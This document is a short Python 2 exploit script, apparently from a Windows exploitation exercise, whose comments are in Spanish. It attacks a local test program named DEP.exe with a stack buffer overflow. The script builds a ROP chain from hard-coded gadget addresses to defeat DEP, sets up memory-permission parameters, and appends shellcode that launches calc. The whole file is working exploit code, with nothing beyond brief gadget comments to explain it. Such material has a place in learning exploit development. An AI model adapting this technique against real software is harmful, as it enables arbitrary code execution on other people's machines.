from os import *
import struct


shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1"

stdin,stdout = popen4(r'C:\Users\ricna\Desktop\35\DEP\DEP.exe -1')
print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

rop=  struct.pack("<L",0x78003d08)  #POP EAX-RET
rop+= struct.pack("<L",0x7802e0b4)  # IAT DE VA mas 4
rop+= struct.pack("<L",0x780022DE)  # SACA LA DIRECCION DE VA a EAX

rop+= struct.pack("<L",0x780015c8)  # POP ESI- RET
rop+= struct.pack("<L",0x780015b0)  # MUEVO A ESI EL PUNTERO A POP EDI-POP ESI- RET

rop+= struct.pack("<L",0x7801a8DE)  # PUSH EAX -CALL ESI

rop+= struct.pack("<L",0x780012af)  # POP EBP -RET
rop+= struct.pack("<L",0x7800f7c1)  # PUSH ESP-RET

rop+= struct.pack("<L",0x78028756)  # POP EDI -RET
rop+= struct.pack("<L",0x780015c9)  # RET

rop+= struct.pack("<L",0x78003d08)  # POP EAX -RET
rop+= struct.pack("<L",0x90909090)  # 0x90909090

rop+= struct.pack("<L",0x7800235a)  # POP EBX -RET
rop+= struct.pack("<L",0x1)         # 1

rop+= struct.pack("<L",0x780012c1)  # POP ECX -RET
rop+= struct.pack("<L",0x40)        # 0x40

rop+= struct.pack("<L",0x78028998)  # POP EDX -RET
rop+= struct.pack("<L",0x1000)  # 0x1000

rop+= struct.pack("<L",0x78009791)  # PUSHAD-RET

fruta="A" * 772 + rop + shellcode + "\n"

print stdin

print "Escribe: " + fruta
stdin.write(fruta)
print stdout.read(40)




